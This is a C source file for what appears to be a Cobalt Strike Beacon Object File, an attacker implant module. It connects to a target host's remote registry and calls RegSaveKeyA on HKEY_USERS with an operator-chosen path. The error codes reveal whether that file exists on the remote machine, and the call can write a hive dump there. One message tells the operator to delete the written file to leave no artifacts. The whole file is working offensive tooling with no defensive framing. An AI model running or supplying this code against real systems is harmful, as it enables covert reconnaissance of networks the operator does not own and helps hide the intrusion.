#include <windows.h>
#include <stdio.h>
#include "../beacon.h"

VOID go(
    IN PCHAR Buffer,
    IN ULONG Length
)
{
    datap parser = {0};
    const char* hostname = NULL;
    const char* path = NULL;
    BeaconDataParse(&parser, Buffer, Length);
    hostname = BeaconDataExtract(&parser, NULL);
    path = BeaconDataExtract(&parser, NULL);

    char remoteName[256];
    // Prepend "\\" for UNC format
    snprintf(remoteName, sizeof(remoteName), "\\\\%s", hostname);

    HKEY hRemoteBase = NULL;

    // Connect to remote registry
    LONG result = RegConnectRegistryA(
        remoteName,
        HKEY_USERS,
        &hRemoteBase
    );

    if (result != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "RegConnectRegistry failed: 0x%08x. Are you a domain-joined user?", result);
        return;
    }

    HKEY hkResult;
    if (RegOpenKeyA(hRemoteBase, "", &hkResult) != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "Could not open HKU");
        RegCloseKey(hRemoteBase);
        return;
    }

    // Save key
    result = RegSaveKeyA(
        hkResult,
        path,
        NULL
    );

    if (result == ERROR_ACCESS_DENIED) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] %s does NOT exist on %s.", path, hostname);
    } else if (result == ERROR_ALREADY_EXISTS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] %s exists on %s.", path, hostname);
    } else if (result == ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] %s did not exist and has been written to %s. Make sure to delete to leave no artifacts!", path, hostname);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "Unknown error code: 0x%08x.", result);
    }

    // Cleanup
    RegCloseKey(hRemoteBase);
    RegCloseKey(hkResult);
};
